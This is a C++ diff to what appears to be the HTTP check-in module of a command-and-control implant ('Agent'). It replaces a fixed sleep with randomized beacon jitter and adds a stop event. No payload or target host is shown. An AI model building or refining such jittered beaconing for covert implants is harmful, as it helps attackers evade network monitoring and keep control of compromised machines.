@@ -5,8 +5,22 @@
 
 
 HTTPCommunicationModule::HTTPCommunicationModule(const std::string& address, int port, Agent& agent_ref)
-	: Address(address), Port(port), httpClient(), running(false), agent(agent_ref)
+	: Address(address), Port(port), httpClient(), running(false), agent(agent_ref),
+	  hStopEvent(CreateEvent(NULL, TRUE, FALSE, NULL)),
+	  rng(std::random_device{}())
 {
+}
+
+HTTPCommunicationModule::~HTTPCommunicationModule() {
+	if (hStopEvent) CloseHandle(hStopEvent);
+}
+
+DWORD HTTPCommunicationModule::nextSleepMs() {
+	std::uniform_int_distribution<DWORD> dist(
+		BEACON_INTERVAL_MS - BEACON_JITTER_MS,
+		BEACON_INTERVAL_MS + BEACON_JITTER_MS
+	);
+	return dist(rng);
 }
 
 void HTTPCommunicationModule::Config(){
@@ -24,14 +38,16 @@ void HTTPCommunicationModule::Config(){
 
 void HTTPCommunicationModule::Start() {
 	while (running) {
-		Checkin(); //Send Results
-		Sleep(5000); // Espera 5 segundos entre cada ciclo
+		Checkin();
+		// Sleep with jitter; wakes immediately if Stop() signals hStopEvent.
+		DWORD result = WaitForSingleObject(hStopEvent, nextSleepMs());
+		if (result == WAIT_OBJECT_0) break;
 	}
-			
 }
 
 void HTTPCommunicationModule::Stop() {
 	running = false;
+	if (hStopEvent) SetEvent(hStopEvent);
 }
 
 void HTTPCommunicationModule::Checkin(){
